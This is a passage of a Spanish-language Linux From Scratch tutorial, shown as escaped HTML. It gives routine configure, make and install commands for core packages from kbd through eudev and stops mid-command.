&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;patch &lt;span class=&quot;nt&quot;&gt;-Np1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ../kbd-2.2.0-backspace-1.patch

&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/\(RESIZECONS_PROGS=\)yes/\1no/g'&lt;/span&gt; configure
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/resizecons.8 //'&lt;/span&gt; docs/man/man8/Makefile.in

&lt;span class=&quot;nv&quot;&gt;PKG_CONFIG_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools/lib/pkgconfig ./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--disable-vlock&lt;/span&gt;

make
make check
make &lt;span class=&quot;nb&quot;&gt;install

mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;       /usr/share/doc/kbd-2.2.0
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; docs/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /usr/share/doc/kbd-2.2.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;libpipeline-en-lfs&quot;&gt;Libpipeline en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;make-en-lfs&quot;&gt;Make en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr

make
make &lt;span class=&quot;nv&quot;&gt;PERL5LIB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PWD&lt;/span&gt;/tests/ check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;patch-en-lfs&quot;&gt;Patch en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;man-db-en-lfs&quot;&gt;MAN DB en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr                        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/man-db-2.9.0 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--sysconfdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc                    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-setuid&lt;/span&gt;                     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--enable-cache-owner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bin             &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-browser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/bin/lynx         &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-vgrind&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/bin/vgrind        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-grap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/bin/grap            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-systemdtmpfilesdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;           &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-systemdsystemunitdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;tar-en-lfs&quot;&gt;Tar en LFS&lt;/h5&gt;

&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: La instalación de este paquete puede demorar un buen rato.&lt;/p&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;FORCE_UNSAFE_CONFIGURE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--bindir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin

make
make check
make &lt;span class=&quot;nb&quot;&gt;install

&lt;/span&gt;make &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; doc install-html &lt;span class=&quot;nv&quot;&gt;docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/tar-1.32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;texinfo-en-lfs&quot;&gt;Texinfo en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt;

make
make check
make &lt;span class=&quot;nb&quot;&gt;install

&lt;/span&gt;make &lt;span class=&quot;nv&quot;&gt;TEXMF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/texmf install-tex

&lt;span class=&quot;nb&quot;&gt;pushd&lt;/span&gt; /usr/share/info
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;f &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;install-info &lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir &lt;/span&gt;2&amp;gt;/dev/null
&lt;span class=&quot;k&quot;&gt;done
&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;popd&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;vim-en-lfs&quot;&gt;Vim en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#define SYS_VIMRC_FILE &quot;/etc/vimrc&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; src/feature.h

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr

make

&lt;span class=&quot;nb&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Rv&lt;/span&gt; nobody &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
su nobody &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /bin/bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;LANG=en_US.UTF-8 make -j1 test&quot;&lt;/span&gt; &amp;amp;&amp;gt; vim-test.log
make &lt;span class=&quot;nb&quot;&gt;install

ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; vim /usr/bin/vi
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;L &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;  /usr/share/man/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;man1/vim.1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; vim.1 &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$L&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;/vi.1
&lt;span class=&quot;k&quot;&gt;done

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; ../vim/vim82/doc /usr/share/doc/vim-8.2.0190

&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/vimrc &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
&quot; Begin /etc/vimrc

&quot; Ensure defaults are set before customizing settings, not after
source &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$VIMRUNTIME&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;/defaults.vim
let skip_defaults_vim=1 

set nocompatible
set backspace=2
set mouse=
syntax on
if (&amp;amp;term == &quot;xterm&quot;) || (&amp;amp;term == &quot;putty&quot;)
  set background=dark
endif

&quot; End /etc/vimrc
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;procps-en-lfs&quot;&gt;Procps en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr                            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--exec-prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;                           &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--libdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/lib                        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/procps-ng-3.3.15 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt;                         &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-kill&lt;/span&gt;

make

&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s|(pmap_initname)\\\$|\1|'&lt;/span&gt; testsuite/pmap.test/pmap.exp
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/set tty/d'&lt;/span&gt; testsuite/pkill.test/pkill.exp
&lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;testsuite/pgrep.test/pgrep.exp
make check

make &lt;span class=&quot;nb&quot;&gt;install

mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/lib/libprocps.so.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /lib
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ../../lib/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;readlink&lt;/span&gt; /usr/lib/libprocps.so&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; /usr/lib/libprocps.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;util-linux-en-lfs&quot;&gt;Util Linux en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /var/lib/hwclock

./configure &lt;span class=&quot;nv&quot;&gt;ADJTIME_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/lib/hwclock/adjtime   &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/util-linux-2.35.1 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-chfn-chsh&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-login&lt;/span&gt;      &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-nologin&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-su&lt;/span&gt;         &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-setpriv&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-runuser&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-pylibmount&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt;     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--without-python&lt;/span&gt;     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--without-systemd&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--without-systemdsystemunitdir&lt;/span&gt;

make

&lt;span class=&quot;nb&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Rv&lt;/span&gt; nobody &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
su nobody &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /bin/bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PATH=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; make -k check&quot;&lt;/span&gt;

make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;e2fsprogs-en-lfs&quot;&gt;E2fsprogs en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; build
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;build

../configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr           &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--bindir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin           &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--with-root-prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;   &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--enable-elf-shlibs&lt;/span&gt;     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--disable-libblkid&lt;/span&gt;      &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--disable-libuuid&lt;/span&gt;       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--disable-uuidd&lt;/span&gt;         &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--disable-fsck&lt;/span&gt;

make
make check
make &lt;span class=&quot;nb&quot;&gt;install

chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; u+w /usr/lib/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;libcom_err,libe2p,libext2fs,libss&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.a

&lt;span class=&quot;nb&quot;&gt;gunzip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/share/info/libext2fs.info.gz
install-info &lt;span class=&quot;nt&quot;&gt;--dir-file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/info/dir /usr/share/info/libext2fs.info

makeinfo &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt;      doc/com_err.info ../lib/et/com_err.texinfo
&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m644&lt;/span&gt; doc/com_err.info /usr/share/info
install-info &lt;span class=&quot;nt&quot;&gt;--dir-file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/info/dir /usr/share/info/com_err.info
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;sysklogd-en-lfs&quot;&gt;Sysklogd en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/Error loading kernel symbols/{n;n;d}'&lt;/span&gt; ksym_mod.c
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/union wait/int/'&lt;/span&gt; syslogd.c

make

make &lt;span class=&quot;nv&quot;&gt;BINDIR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/sbin &lt;span class=&quot;nb&quot;&gt;install

cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/syslog.conf &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
# Begin /etc/syslog.conf

auth,authpriv.* -/var/log/auth.log
*.*;auth,authpriv.none -/var/log/sys.log
daemon.* -/var/log/daemon.log
kern.* -/var/log/kern.log
mail.* -/var/log/mail.log
user.* -/var/log/user.log
*.emerg *

# End /etc/syslog.conf
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;sysvinit-en-lfs&quot;&gt;Sysvinit en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;patch &lt;span class=&quot;nt&quot;&gt;-Np1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ../sysvinit-2.96-consolidated-1.patch

make
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;eudev-en-lfs&quot;&gt;Eudev en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr           &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--bindir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/sbin          &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--sbindir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/sbin         &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--libdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/lib       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--sysconfdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--libexecdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/lib       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-rootprefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;      &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-rootlibdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/lib  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
